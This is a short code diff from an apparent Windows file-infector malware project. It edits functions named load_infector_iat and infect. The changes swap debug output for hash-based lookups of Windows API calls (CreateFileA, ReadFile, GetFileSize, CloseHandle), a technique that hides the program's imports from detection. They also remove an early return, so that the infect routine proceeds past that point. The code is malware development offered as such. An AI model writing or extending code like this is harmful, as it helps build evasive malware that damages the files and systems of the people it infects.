@@ -199,10 +199,10 @@ void load_infector_iat(InfectorIAT *iat)
    iat->loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    iat->findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
    iat->findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
-   std::cout << "CreateFileA: " << std::hex << fnv321a("CreateFileA") << std::endl;
-   std::cout << "GetFileSize: " << std::hex << fnv321a("GetFileSize") << std::endl;
-   std::cout << "ReadFile: " << std::hex << fnv321a("ReadFile") << std::endl;
-   std::cout << "CloseHandle: " << std::hex << fnv321a("CloseHandle") << std::endl;
+   iat->createFile = reinterpret_cast<CreateFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xbdcac9ce));
+   iat->getFileSize = reinterpret_cast<GetFileSizeHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x44ed8118));
+   iat->readFile = reinterpret_cast<ReadFileHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x54fcc943));
+   iat->closeHandle = reinterpret_cast<CloseHandleHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xfaba0065));
    PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(iat->loadLibrary("msvcrt.dll"));
    iat->malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
    iat->realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
@@ -219,8 +219,6 @@ int infect(void)
 {
    InfectorIAT iat;
    load_infector_iat(&iat);
-
-   return 0;
    
    char profile_directory[MAX_PATH+1];
 
